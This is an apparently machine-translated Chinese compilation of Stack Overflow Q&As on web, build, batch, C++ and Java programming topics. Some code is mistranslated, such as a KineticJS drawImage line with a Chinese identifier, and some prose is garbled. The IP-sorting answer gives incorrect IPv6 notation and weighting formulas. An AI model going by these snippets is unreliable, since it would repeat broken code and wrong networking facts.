    email.putExtra(android.content.Intent.EXTRA_TEXT, Html.fromHtml(msg));
    email.setType("message/rfc822");
    startActivity(Intent.createChooser(email, "Choose an Email client :"));
} 
```

# facebook - 脸书应用开发；自动生成的 heroku prod 主机；本地开发虚拟主机；隧道；FB登录问题

> ID：13756203
> 
> 赞同：4
> 
> 时间：2012-12-07T02:46:53.457
> 
> 标签：facebook, facebook-graph-api

我正在使用自定义 Open Graph 操作和对象开发我的第一个 Facebook 应用程序，并且我试图避免在每次代码更改后都需要进行部署（在这种情况下，部署到我的自动设置的 heroku 帐户）。

当我准备测试我的第一个自定义操作的发布时，问题就开始了。我试图根据我的 Facebook 应用程序的开发版本设置所有内容，除了我的“对象”页面，据我所知，该页面需要公开访问（以抓取 OG 元标签）。

我为我的自定义对象创建了一个测试页，将自动生成的 OG 元标记集复制到其中（引用我的 app_id 的开发版本，但使用我的应用程序的产品版本的公共 URL 为 og： url）然后，我在该测试页面上使用了 facebook“lint”工具，我想这并不奇怪，它抱怨该公共域对相关应用程序（我的 facebook 应用程序的开发版本）无效。

```
Object Base Domain Not Allowed: Object at URL 
'http://foo.herokuapp.com/testEventPage.php' of type 'foo:product' is 
invalid because the domain 'foo.herokuapp.com' is not allowed 
for the specified application id '(the app_id)'. 
```

然后，我了解了如何使用 Tunnlr 从公共站点端口转发到我的本地环境，并着手进行设置。

我将 MAMP 与虚拟主机配置一起使用，如下所示：

```
<VirtualHost *:8888>
  DocumentRoot "(the relevant docroot)"
  ServerName foo.local
  SetEnv FACEBOOK_APP_ID (my dev FB app-id)
  SetEnv FACEBOOK_SECRET (my dev FB secret)
</VirtualHost> 
```

我正在使用 tunnlr，它的 cmdln 指向端口 8888。

使用 Tunnlr 提供的公共 URL，我成功访问了我的本地页面，但是，当我尝试使用 Facebook 的示例 PHP 代码附带的页面上的“登录”按钮时，会弹出登录对话框，但是立即消失，尽管直接在本地访问它时它工作正常。

这可能与cookie有关吗？与端口转发和 cookie 有关吗？

有没有更好的方法来开发 Facebook 应用程序，特别是那些涉及自定义 Open Graph 操作和对象的应用程序？

编辑：就像医生说的那样，如果你这样移动你的手臂时疼，不要那样移动你的手臂！换句话说，通过 Facebook-Canvas URL 访问 Tunnlr-URL，它将嵌入页面的当前登录发布到您自己的页面；并且，作为用户（可选测试用户），不要使用示例代码的登录按钮；而是使用嵌入页面的登录功能。所以，我已经回答了我自己的问题。

# javascript - 如果课程也是课程然后..点击移动活动课程

> ID：13756205
> 
> 赞同：0
> 
> 时间：2012-12-07T02:47:06.323
> 
> 标签：javascript, jquery, class, if-statement

（jQuery 的新功能）

尝试编写一个函数，将活动类沿箭头移动。

**html**

```
<div id="steps">
    <a href="#1" data-ref="dynamic-tabs slider-id">
        <div class="step step-1 active">
            <div class="step-img">
                <img width="175" height="120" src="http://site.com/img.png">
            </div>
            <div class="step-title">Schedule Online or Wave Down a Biker</div>
            <div class="step-over"></div>
         </div>
      </a>

     <a href="#2" data-ref="dynamic-tabs slider-id">
         <div class="step step-2">
             <div class="step-img">
                 <img width="175" height="120" src="http://site.com/img.png">
             </div>
             <div class="step-title">We Bike to & Clean Your Car</div>
             <div class="step-over"></div>
         </div>
     </a>

     <a href="#3" data-ref="dynamic-tabs slider-id">
         <div class="step step-3">
             <div class="step-img">
                 <img width="175" height="120" src="http://site.com/img.png">
             </div>
             <div class="step-title">Come Back to a Clean Car</div>
             <div class="step-over"></div>
         </div>
     </a>
 </div>

<div class="nav-right" data-dir="next" title="Slide right">
    <a href="#">right »</a>
</div> 
```

**jQuery 我正在尝试**

```
$(".nav-right a").click(function() {
    if( $(".step-1").is('.active') ) {
      $(".step-1").removeClass("active");
      $(".step-2").addClass("active");
    }
});

$(".nav-right a").click(function() {
    if( $(".step-2").is(".active") ) {
      $(".step-2").removeClass("active");
      $(".step-3").addClass("active");
    } 
});

$(".nav-right a").click(function() {
    if( $(".step-3").is(".active") ) {
      $(".step-3").removeClass("active");
      $(".step-1").addClass("active");
    } 
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T03:05:43.573

问题似乎是您创建了 3 个（原文如此！）事件处理程序，当您单击链接时会按顺序触发。

1.  当步骤 1 处于活动状态时，第一个处理程序将步骤 2 设置为活动状态。
2.  第二个处理程序，因为第 2 步现在处于活动状态，所以将第 3 步设置为活动
3.  第三个处理程序，因为第 3 步现在处于活动状态，所以将第 1 步再次设置为活动。

最后，什么都没有发生。

解决方案：仅使用一个事件处理程序和 if-else-statements 而不是仅使用 if-statements：

```
$(".nav-right a").click(function() {
    if( $(".step-1").is('.active') ) {
      $(".step-1").removeClass("active");
      $(".step-2").addClass("active");
    } else if( $(".step-2").is(".active") ) {
      $(".step-2").removeClass("active");
      $(".step-3").addClass("active");
    } else if( $(".step-3").is(".active") ) {
      $(".step-3").removeClass("active");
      $(".step-1").addClass("active");
    } 
}); 
```

当然，我们可以做得更好，写一个通用函数，它也不需要`step-N`类：

```
var rotatedElements = $(".step");
$(".nav-right a").click(function() {
    var cur = rotatedElements.filter(".active");
    cur.removeClass("active");
    var index = rotatedElements.index(cur) + 1;
    if (index >= rotatedElements.length)
        index = 0;
    rotatedElements.eq(index).addClass("active");
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T03:07:05.893

正如theScientist 在评论中所建议的，您应该只使用一个事件处理程序。

```
$(".nav-right a").click(function() {
    if( $(".step-1").is('.active') ) {alert('1');
      $(".step-1").removeClass("active");
      $(".step-2").addClass("active");
      return;                                 
    }
     if( $(".step-2").is(".active") ) {alert('2');
      $(".step-2").removeClass("active");
      $(".step-3").addClass("active");   return;        
    } 
      if( $(".step-3").is(".active") ) {alert('3');
      $(".step-3").removeClass("active");
      $(".step-1").addClass("active");   return;       
    } 
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T03:21:41.217

在这里，它在一个处理程序中，并且尽可能简洁：

```
$(".nav-right a").click(function() {
    var $steps = $(".step"),
        index = $steps.filter('.active').removeClass("active").index();
    $steps.eq((index + 1) % $steps.length).addClass('active');
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T03:16:37.050

这里有几个问题，但要解决这个问题，您可以将代码简化为此并删除对 .step1、.step2 等的依赖，以防您决定添加更多步骤。

```
$('.nav-right').find('a').on('click', function(e) {
    e.preventDefault();
    var $activeStep = $('.step.active'),
        $expectedNextStep = $activeStep.closest('a').next().find('.step'),
        $nextActiveStep = $expectedNextStep.length ? $expectedNextStep : $('.step').first();

    $activeStep.removeClass('active');
    $nextActiveStep.addClass('active');
}); 
```

​ 然而；我强烈建议将其放在有序列表中，而不是将块元素包装在锚中。该页面将按您的方式工作，但语义很差。

# javascript - createImageHitRegion 不随图像对象缩放

> ID：13756207
> 
> 赞同：1
> 
> 时间：2012-12-07T02:47:15.203
> 
> 标签：javascript, kineticjs

我正在使用这样的 Kinetic.image 对象：

```
this.icon = new Kinetic.Image({
    x: self.x,
    y: self.y,
    offset: [32,32],
    image: self.imageItem.image,
    width: self.size,
    height: self.size,
    scale: self.scale,
    rotationDeg: self.angle,
    draggable: true
}); 
```

该图像是具有透明像素的 PNG。我还创建了一个图像命中区域：

```
self.icon.createImageHitRegion(function() {
    self.icon.getLayer().drawHit();
}); 
```

但是，当我使用 mouseover 事件时，命中区域是错误的。我怀疑命中区域没有缩放。请注意，我还使用偏移量，以便图像围绕其中心旋转。

我做错了什么我在这里处理错误吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-02T22:12:53.223

当创建图像传递宽度和高度时，我遇到了同样的问题。该库使用图像的宽度和高度来创建画布以绘制命中区域，但宽度和高度不用于缩放在画布上绘制的图像。

如果您搜索 kineticjs 源代码，您会看到在 createImageHitRegion 内部有一行类似于：

_context.drawImage(图像, 0, 0);

添加图像的宽度和高度，它应该可以按预期工作：

_context.drawImage(image, 0, 0, this.getWidth(), this.getHeight());

在我的情况下，我不必在创建图像时传递 scale 属性，请在您提供 scale 属性时验证这是否有效，否则您将不得不调整 createImageHitRegion 来解决这个问题。

# bookmarklet - 无法打开我在新窗口或标签中创建的 javascript 小书签

> ID：13756212
> 
> 赞同：2
> 
> 时间：2012-12-07T02:48:03.560
> 
> 标签：bookmarklet

首先，我对代码知之甚少，并从查看其他示例的工作方式中学习。

我创建了一个可以正常工作的书签，但我真的希望它在新选项卡或窗口中打开。

这是当前正在使用的代码：

```
<a href='javascript:q = "" +(window.getSelection ?  window.getSelection() : document.getSelection ? document.getSelection() : document.selection.createRange().text); if (!q) q = prompt("Find the QSR of a search phrase, Simply enter a phrase wrapped in Quotes", ""); if (q!=null) location="http://www.google.com/search?q= " + escape(q).replace(/ /g, ""+"")+"&start=900#" ; void 0' ;
        <font color="#000000">QSR</font></a> 
```

所以这个书签背后的想法是找到谷歌搜索结果的总数，其中包含一个用引号括起来的短语。单击 QSR，您将在引号中输入短语，我想要的是当您单击确定时，它会在新选项卡或窗口中打开。

我还注意到，如果我突出显示页面上的某些文本，然后按我的 QSR 书签，它将使用突出显示的文本来执行搜索，但我再次需要在新选项卡或窗口中打开它。

我一直试图解决这个问题，但没有任何运气，这甚至可能吗？任何帮助是极大的赞赏。克雷格

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T16:15:00.557

改变

```
location="http://www.google.com/search?q= " + escape(q).replace(/ /g, ""+"")+"&start=900#" 
```

到

```
window.open("http://www.google.com/search?q= " + escape(q).replace(/ /g, ""+"")+"&start=900#") 
```

# jquery - 我正在寻找在线就地编辑器

> ID：13756214
> 
> 赞同：1
> 
> 时间：2012-12-07T02:48:08.673
> 
> 标签：jquery

任何在线就地编辑器推荐？我需要一些可以就地编辑我的`<p>`标签的 jquery 插件。目前我正在使用一个名为 inlineEdit.js 的库>它可以很好地用于编辑。但我不喜欢它需要点击保存的方式。我想要它，就像我离开盒子一样，它会保存。另外，我希望它有可以创建链接和更改字体的栏。我也尝试了一些富编辑器，我喜欢的是elRTE。但我不喜欢它没有在我的`<p>`标签中添加文本的方式。有人有建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T02:49:50.007

看看[Redactor](http://imperavi.com/redactor/)，我已经取得了巨大的成功，它的可扩展性和轻量级足以满足我的目的。

# ubuntu - 詹金斯“控制台输出”实际上是空的

> ID：13756215
> 
> 赞同：14
> 
> 时间：2012-12-07T02:48:23.013
> 
> 标签：ubuntu, configuration, console, jenkins, output

我在 Ubuntu 上安装了全新的 Jenkins

1.  新工作 -> 构建多配置项目
2.  向下滚动并单击“添加构建步骤”-> 执行 shell 并输入：

    ```
    echo hello 
    ```

3.  运行作业（成功）

4.  查看运行的控制台输出：

    ```
    Started by user My Name
    Building in workspace /var/lib/jenkins/jobs/my_job/workspace
    Triggering default
    default completed with result SUCCESS
    Finished: SUCCESS 
    ```

再次执行这些步骤，但使用 Execute shell：

```
echo hello
thisshouldfail 
```

你得到...

```
Started by user My Name
Building in workspace /var/lib/jenkins/jobs/my_job/workspace
Triggering default
default completed with result FAILURE
Finished: FAILURE 
```

请注意，您在输出中看不到“hello”。这适用于我可能放入该 Execute Shell 的任何内容。有什么帮助吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-12-08T20:36:45.087

运行*Multi-Configuration*项目时，您看到的日志是**Manager-job**，
它只向您显示完整运行的摘要，基本上是：
“我运行了所有作业，一切正常”（`Finished: SUCCESS`）
或
“我完成了你所有的工作，但至少有一个失败了”（`Finished: FAILURE`）

它不能为您提供所有运行的单个日志，因为它们运行了多次
（在不同的从站和/或不同的配置上）。

要查看每次运行的日志，请单击矩阵中的每个红色（或蓝色）“球”——
每个代表该多配置构建的单个实例。

# batch-file - 以管理员身份批量运行设置文件？

> ID：13756216
> 
> 赞同：0
> 
> 时间：2012-12-07T02:48:31.660
> 
> 标签：batch-file, cmd

我创建了一个批处理来运行特定的命令，代码如下所示：

```
cd  D:\projects\Project Stress Test\signed one\com0com\x64
setupc
pause 
```

我想要以`setupc`管理员身份运行文件？

我尝试`runas /user:<Name>\administrator`了命令，但它没有用。

有什么简单的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T22:22:16.197

您可以使整个脚本在管理员级别运行。这是我在脚本中使用的批处理函数。

```
@echo off
call :Admin xReturn true 1
echo.%xReturn%
goto End

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:Admin <Return> [Needed] [Success]
:: Check for Administrator privileges and request privileges if needed.
:: NOTE: This will restart the script with Admin privs if Needed is set to true.
:::: Usage: call :Admin xReturn true
:: Return success value, if user is Admin. Default `true` if Success not set.
setlocal
set xVBUAC=%Temp%\AdminUAC.vbs
set xSuccess=true
if not "%~3"=="" set xSuccess=%~3

:: Check for Access
::net session >nul 2>&1
>nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"
if %ErrorLevel% EQU 0 set xAdmin=%xSuccess%

:: Execute UAC
if /i not "%xAdmin%"=="%xSuccess%" if not "%~2"=="" if /i "%~2"=="true" (
  echo Set UAC = CreateObject^("Shell.Application"^) > "%xVBUAC%"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%xVBUAC%"
    if exist "%xVBUAC%" (
        "%xVBUAC%"
        rem if %ErrorLevel% EQU 5 echo Access Denied. Launching UAC.
        del "%xVBUAC%"
    )
)
endlocal & if not "%~1"=="" set "%~1=%xAdmin%"
goto :eof

:End 
```

# batch-file - 多次拆分批处理文件中的参数

> ID：13756224
> 
> 赞同：0
> 
> 时间：2012-12-07T02:50:19.050
> 
> 标签：batch-file, arguments, parameter-passing, command-line-arguments

示例批处理执行：

```
test.bat /s v1.1 1,3,4,5 
```

我想使用空格作为分隔符将参数拆分为三个标记。结果应该是：

第一个令牌 = /s

第二个令牌 = /v1.1

第三个令牌 = 1,3,4,5

然后将使用逗号作为分隔符再次拆分第三个标记

下面的代码使用常见的分隔符（如空格、逗号等）拆分参数。

```
@ECHO OFF

SET PARAMS=

:_PARAMS_LOOP

SET PARAMS=%PARAMS%%1 
ECHO %1
SHIFT

IF NOT "%1"=="" GOTO _PARAMS_LOOP 
```

执行：

```
test.bat /s v4.1 1,2,3,4 
```

结果：

```
/s
v4.1
1
3
4
5 
```

我只想使用空格作为分隔符，然后在第三个标记（1,3,4,5）中，我将使用逗号作为分隔符再次拆分它并回显它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-08T17:16:30.223

问题是 cmd 将空格、制表符、逗号、分号或等号识别为命令行分隔符，除非它们用双引号引起来。

> **分隔符**
> 
> 批处理文件会忽略命令行中的某些字符，具体取决于 DOS 版本、是否“转义”，并且通常取决于它们在命令行中的位置：
> 
> *   逗号 (",") 被空格替换，除非它们是双引号中字符串的一部分
> *   分号 (";") 被空格替换，除非它们是双引号中字符串的一部分
> *   "=" 字符有时会被空格替换，而不是如果它们是双引号中字符串的一部分
> *   第一个正斜杠 ("/") 仅当它紧跟在命令后面时才被空格替换，没有前导空格
> *   多个空格被单个空格替换，除非它们是双引号中字符串的一部分
> *   制表符被单个空格替换
> *   第一个命令行参数之前的前导空格被忽略
> 
> 我知道有好几次这些看似无用的“功能”被证明非常方便。但请记住，这些“功能”可能会因所使用的操作系统而异。
> 
> 更多关于命令行解析的信息可以在 PATH 和 FOR（尤其是 FOR 的交互式示例）页面上找到。

[http://www.robvanderwoude.com/parameters.php](http://www.robvanderwoude.com/parameters.php)

# javascript - jQuery Cycle Plugin：为什么在这个官方演示中寻呼机没有显示确切的图像数量？

> ID：13756225
> 
> 赞同：1
> 
> 时间：2012-12-07T02:50:24.800
> 
> 标签：javascript, jquery, html, cycle, jquery-cycle

我正在尝试将 jQuery Cycle 插件与寻呼机一起使用（[jQuery Cycle 插件](http://jquery.malsup.com/cycle/)是一个幻灯片插件。）

为什么在这个官方循环演示中寻呼机没有显示确切的图像数量：

[http://jquery.malsup.com/cycle/pager11.html](http://jquery.malsup.com/cycle/pager11.html)

如果您查看代码，则有 8 张图片：

```
<div id="slideshow" class="pics" style="margin:auto;clear:left;margin-top:40px">
    <img src="malsup/cycle/beach1.jpg" />
    <img src="malsup/cycle/beach2.jpg" />
    <img src="malsup/cycle/beach3.jpg" />
    <img src="malsup/cycle/beach4.jpg" />
    <img src="malsup/cycle/beach5.jpg" />
    <img src="malsup/cycle/beach6.jpg" />
    <img src="malsup/cycle/beach7.jpg" />
    <img src="malsup/cycle/beach8.jpg" />
</div> 
```

寻呼机只显示 3 个按钮。它应该显示 8 个按钮？

### 编辑：JavaScript代码：

```
$(function() {

    $('#slideshow').cycle({
        fx:      'scrollHorz',
        timeout:  0,
        prev:    '#prev',
        next:    '#next',
        pager:   '#nav',
        pagerAnchorBuilder: pagerFactory
    });

    function pagerFactory(idx, slide) {
        var s = idx > 2 ? ' style="display:none"' : '';
        return '<li'+s+'><a href="#">'+(idx+1)+'</a></li>';
    };

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:03:12.813

它不会显示第三个以外的任何锚点，因为`pagerFactory()`回调显式设置`style='display:none;'`在这些锚点上。

```
function pagerFactory(idx, slide) {
    // This line tests if the anchor's index is > 2
    // (beyond the 3rd anchor) and sets its display property to none
    var s = idx > 2 ? ' style="display:none"' : '';
    return '<li'+s+'><a href="#">'+(idx+1)+'</a></li>';
}; 
```

通过浏览器的检查器可以看到这对 DOM 的影响：

```
<ul id="nav">
  <li class="activeSlide"><a href="#">1</a></li>
  <li><a href="#">2</a></li>
  <li><a href="#">3</a></li>
  <li style="display:none"><a href="#">4</a></li>
  <li style="display:none"><a href="#">5</a></li>
  <li style="display:none"><a href="#">6</a></li>
  <li style="display:none"><a href="#">7</a></li>
  <li style="display:none"><a href="#">8</a></li>
</ul> 
```

现在至于官方demo*为什么*会这样？我不知道 - 这是开发人员的问题。它确实说明了如何`pagerAnchorBuilder`根据它们的索引使用回调在每个寻呼机锚上设置不同的属性。

# c++ - 如何为 __uint128_t 实现自定义 Boost 哈希函数？

> ID：13756226
> 
> 赞同：2
> 
> 时间：2012-12-07T02:50:33.537
> 
> 标签：c++, boost, hash, 64-bit

如何为与 Boost 兼容的 __uint128_t 类型实现哈希函数？

我试过这个：

```
#include <boost/functional/hash.hpp>
#include <unordered_set>

#ifdef USE_64
typedef uint64_t MyId; // works fine
#else
typedef __uint128_t MyId;
#endif

inline std::size_t hash_value (const MyId x)
{
    // not a very good hash function, but I just want to get it working first!
    return static_cast<std::size_t>(x);
}

int main (int argc, char *argv[])
{
    std::unordered_set<MyId, boost::hash<MyId>> s;
    s.insert(42);
} 
```

但我在 64 位 Scientific Linux 6.2 上使用 g++-4.7.2 和 Boost v1.51.0 得到 144 行错误（！）：

```
error: no matching function for call to 'hash_value(const __int128 unsigned&)' 
```

任何指导将不胜感激。TIA。

# webpage - 将 .js 放在外部文件中而不是直接放在页面上要慢多少？

> ID：13756228
> 
> 赞同：0
> 
> 时间：2012-12-07T02:50:42.967
> 
> 标签：webpage, pagespeed

我假设如果您将一些 Javascript 代码放在外部源中（并使用 src=""），那么它的 b/c 速度会慢一些，然后页面必须下载另一部分，但我想知道这是否无关紧要。

从我在线完成的测试（使用[webpagetest.org](http://www.webpagetest.org)）来看，它似乎很小（< 总页面加载时间的5%）。

但是只是想知道“幕后”发生了什么以及浏览器（我假设）是否正在启动另一个进程以单独下载该位而不是从服务器与页面的其余部分一起下载实际上同样快（b / c 它同时发生）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:06:41.857

如果您在 Firefox 中使用 Firebug 进行测试，您会看到 Firefox 正在同时下载多个文件（每个浏览器的并发文件数不同）。但是你应该把js代码放在外部文件中的主要原因是它可以在服务器端被缩小和压缩，也可以被浏览器缓存。从外部文件加载它还具有能够从静态域（无 cookie）加载它并使用 CDN 加速交付的好处。因此，要回答您的问题，将其放入页面会更慢，因为浏览器每次加载页面时都需要下载它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T03:25:27.330

## 不够慢，没有关系。

我认为速度差异问题是一个红鲱鱼。通常，您应该将脚本与 html 分开：

*   关注点分离：html 是网站的结构，而脚本是网站的行为。它将[关注点](https://softwareengineering.stackexchange.com/a/86595/28793)混合在一起，[最好](http://www.catswhocode.com/blog/best-practices-for-modern-javascript-development)将脚本保存在单独的文件中。
*   与 html 分开提供的脚本可能同样快[甚至更快](http://developer.yahoo.com/blogs/ydn/posts/2007/07/rule_8_make_jav/)，这似乎违反直觉，但是诸如[缓存代理服务器](http://en.wikipedia.org/wiki/Proxy_server)、[内容交付网络](http://en.wikipedia.org/wiki/Content_delivery_network)，甚至像[SPDY](http://en.wikipedia.org/wiki/SPDY)这样的新 Web 协议之类的东西都可以使速度问题完全没有意义。

# ios - ccTouchesBegan 未调用

> ID：13756232
> 
> 赞同：1
> 
> 时间：2012-12-07T02:51:37.163
> 
> 标签：ios, objective-c, cocos2d-iphone, touches

我正在尝试`ccTouchesBegan`在我的 GameScene 中实现。

我已经设置了`isTouchEnabled = YES`。我也在打电话`addStandardDelegate`。`touchDispatcher`最后，在我的`AppDelegate`我有`[glView setMultipleTouchEnabled:YES]`.

但是，从未调用 ccTouchesBegan。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T17:51:47.353

解决了！

我在前一层上注册了触摸，但是该层没有被释放，因为您必须使用该`onExit`方法“取消注册”。

长话短说：`touchesBegan`我的 GameLayer 没有被调用，因为它被另一层吞噬了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T06:19:23.817

创建一个虚拟应用程序并尝试以下操作：

```
@protocol CCStandardTouchDelegate <NSObject>
@optional
- (void)ccTouchesBegan:(NSSet *)touches withEvent:(UIEvent *)event;
- (void)ccTouchesMoved:(NSSet *)touches withEvent:(UIEvent *)event;
- (void)ccTouchesEnded:(NSSet *)touches withEvent:(UIEvent *)event;
- (void)ccTouchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event;
@end 
```

也许它会帮助你..

# java - 如何按升序对ip地址进行排序

> ID：13756235
> 
> 赞同：12
> 
> 时间：2012-12-07T02:51:57.020
> 
> 标签：java, sorting, ip-address

有什么方法可以排序吗？还是我只需要拆分它并使用循环进行比较？输入

```
123.4.245.23
104.244.253.29
1.198.3.93
32.183.93.40
104.30.244.2
104.244.4.1 
```

输出

```
1.198.3.93
32.183.93.40
104.30.244.2
104.244.4.1
104.244.253.29
123.4.245.23 
```

到目前为止，我使用 HashMap 来存储我的数据。我想按 IP 地址升序对值进行排序。似乎 TreeMap 是更好的选择？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2015-12-23T18:53:26.550

**TLDR**

您可以直接跳转到有效的比较方法（请参阅下面的**编辑**部分）或
继续阅读。

* * *

为了对 IP 进行排序，您首先需要了解它们。有两种类型的 IP；`32 Bit`和`128 Bit`。

**32 位** [源](https://upload.wikimedia.org/wikipedia/commons/7/74/Ipv4_address.svg)

[![32 位](../Images/bf4bb29ab468d158ecf084f25b39ff6c.png)](https://i.stack.imgur.com/TDeU3.png)

*   被`32 bit IP`分成 4 组介于`0`和之间的数字`255`。这些组通过一个`.`
*   如上所示，单个组是 8 位数据。这就是组中的数字被限制在`0`和之间的原因`255`。
*   要`32 bit IP`正确格式化 a ，它应该是`int.int.int.int`. 即使 int 是 a `0`，它也必须显示在 IP 地址中。这与`128 bit IP`可能省略`0`s 的 a 不同。例如`::5:`与 相同`0:0:5:0:0:0:0:0`。

**128 位** [源](https://upload.wikimedia.org/wikipedia/commons/7/70/Ipv6_address_leading_zeros.svg)

[![128 位](../Images/117175748f87720b4af828a3fbeacca4.png)](https://i.stack.imgur.com/R8RUt.png)

*   被`128 bit IP`分成 8 组介于`0`和之间的数字`FFFF`（相当于`65535`）。与`32 bit IPs`组不同，这些组是分开购买的`:`。
*   如上所示，单个组是 16 位数据。这就是组中的数字限制在`0`和之间的原因`FFFF`。
*   要`128 bit IP`正确格式化 a ，您必须遵循几条规则。`0`s 可以从组中省略，如果其余组都是，`0`则这些组也可以省略。这些组必须用 . 分隔`:`。如果您省略了组，则不是 a 的最后一组`0`必须后跟 a `:`。这些规则给我们留下了一个格式`int:int:int:int:int:int:int:int`。`0`s 和 groups 被省略的一个例子是`58f:::fff:2:`. 这与`58f:0:0:fff:2:0:0:0`.

**排序**

一旦 IP 被分类到它们各自的组中，它们就可以被分类。要对 IP 进行排序，您需要使用一种称为加权的方法。这是因为简单地将不同的组相加或相乘是行不通的。以这两个IP为例；`192.5.48.198`和`198.48.5.192`。如果将组的值相加或相乘，您将得到相同的答案。所以没有办法使用加法和乘法来准确地比较它们。如果你使用加权，你会得到这样的结果。

**32 位加权**

```
Value of IP = (Group one value * 256^4) + (Group two value * 256^3) +
              (Group three value * 256^2) + (Group four value * 256) 
```

**128 位加权**

```
Value of IP = (Group one value * 65536^8) + (Group two value * 65536^7) +
              (Group three value * 65536^6) + (Group four value * 65536^5) +
              (Group five value * 65536^4) + (Group six value * 65536^3) +
              (Group seven value * 65536^2) + (Group eight value * 65536) 
```

**Java中的代码**

只要 IP 的格式合理正确，此代码就会将两种 IP 分开，然后对它们进行排序。

```
import java.util.*;
import java.math.*; //For BigInteger
import java.util.regex.*;
import java.lang.*;

public class IPSort
{
    String[] tests = {":8:","::::5:6::8","::::5:6::7","::::5:6::8","123..245.23","1...","..1.","123...23",".1..","123..245.23", "123..245.23", "104.244.253.29", "1.198.3.93", "32.183.93.40", "32.183.93.40", "104.30.244.2", "104.244.4.1","0.0.0.1",":a:","::5:3:4:5:6:78","1::2:3","1::2:3:4","1::5:256.2.3.4","1:1:3000.30.30.30","ae80::217:f2ff:254:7:237:98"};
    ArrayList<String> bit32 = new ArrayList<String>();
    ArrayList<String> bit128 = new ArrayList<String>();
    ArrayList<String> cleanBit32 = new ArrayList<String>();
    ArrayList<String> cleanBit128 = new ArrayList<String>();

    boolean myMatcher32Bit(String s)
    {
        Pattern patter32Bit = Pattern.compile("^(?=(?:[^.]*\\.){3}[^.]*$)(?=(?:[^:]*:){0}[^:]*$)(?=(?:[^a-zA-Z]*[^a-zA-Z])*$)");
        Matcher matcher32Bit = patter32Bit.matcher(s);
        return matcher32Bit.find();
    }

    boolean myMatcher128Bit(String s)
    {
        Pattern patter128Bit = Pattern.compile("^(?=(?:[^.]*\\.){0}[^.]*$)(?=(?:[^:]*:){1,7}[^:]*$)");
        Matcher matcher128Bit = patter128Bit.matcher(s);
        return matcher128Bit.find();
    }

    public void sortIntoRespectiveIPTypes()
    {
        for(String s: tests)
        {
            if(myMatcher32Bit(s))
            {
                bit32.add(s);
            }
            else if(myMatcher128Bit(s))
            {
                bit128.add(s);
            }
        }

        System.out.println("32 bit IPs");
        for(String ip: bit32)
        {
            System.out.println("  "+ip);
        }

        System.out.println("\n128 bit IPs");
        for(String ip: bit128)
        {
            System.out.println("  "+ip);
        }

        int count = 0;
        for(String ip: tests)
        {
            if(myMatcher32Bit(ip)==false && myMatcher128Bit(ip)==false)
            {
                count++;
            }
        }

        if(count != 0)
        {
            System.out.println("\nDidn't match an IP format");
            for(String ip: tests)
            {
                if(myMatcher32Bit(ip)==false && myMatcher128Bit(ip)==false)
                {
                    System.out.println("  "+ip);
                }
            }
        }

    }

    public void sort32BitIPs(ArrayList<String> bit32, ArrayList<String> newBit32)
    {
        ArrayList<BigInteger> bigInt32Bit = new ArrayList<BigInteger>();
        for(String ip:bit32)
        {
            String[] tempArray = ip.split("\\.");
            int i=0;
            for(String s:tempArray)
            {
                if(s.equals(""))
                {
                    tempArray[i]="0";
                }
                i++;
            }
            bigInt32Bit.add(convert32Bit(tempArray));
        }

        Collections.sort(bigInt32Bit);

        ArrayList<String> fixFormat = new ArrayList<String>();
        for(String ip:bit32)
        {
            String[] fixArray = ip.split("\\.");
            int i=0;
            for(String s:fixArray)
            {
                if(s.equals(""))
                {
                    fixArray[i]="0";
                }
                i++;
            }

            StringBuilder strBuilder = new StringBuilder();
            for(int i2 = 0; i2 < 4; i2++) 
            {
                if(i2<3)
                {
                    try
                    {
                        if(!fixArray[i2].equals(""))
                        {
                            strBuilder.append(fixArray[i2]+".");
                        }
                        else
                        {
                            strBuilder.append(".");
                        }
                    }
                    catch(Exception e)
                    {
                        strBuilder.append("0.");
                    }
                }
                else
                {
                    try
                    {
                        strBuilder.append(fixArray[i2]);
                    }
                    catch(Exception e)
                    {
                        strBuilder.append("0");
                    }
                }
            }
            String newString = strBuilder.toString();
            fixFormat.add(newString);
            bit32=fixFormat;
        }

        for(BigInteger finalValue:bigInt32Bit)
        {
            for(String ip:bit32)
            {
                String[] tempArray = ip.split("\\.");
                int i=0;
                for(String s:tempArray)
                {
                    if(s.equals(""))
                    {
                        tempArray[i]="0";
                    }
                    i++;
                }
                if(finalValue.equals(convert32Bit(tempArray)))
                {
                    if(!newBit32.contains(ip))
                    {
                        String str = bit32.toString();
                        String findStr = ip;
                        int lastIndex = 0;
                        int count = 0;

                        while(lastIndex != -1){

                            lastIndex = str.indexOf(findStr,lastIndex);

                            if(lastIndex != -1){
                                count++;
                                lastIndex += findStr.length();
                            }
                        }

                        for(int k = 0; k<count;k++)
                        {
                            newBit32.add(ip);
                        }
                    }
                }
            }
        }
    }

    BigInteger convert32Bit(String[] array)
    {
        int[] tempArray = new int[array.length];
        ArrayList<BigInteger> tempBigIntList = new ArrayList<BigInteger>();
        int i = 0;
        for(String s:array)
        {
            int power = 4-i;
            tempArray[i]= Integer.parseInt(s);
            String string = Integer.toString(tempArray[i]);
            BigInteger myBigInt = new BigInteger(string);
            BigInteger num2 = myBigInt.multiply(new BigInteger("256").pow(power));
            tempBigIntList.add(num2);
            i++;
        }
        BigInteger bigInt32Bit = new BigInteger("0");
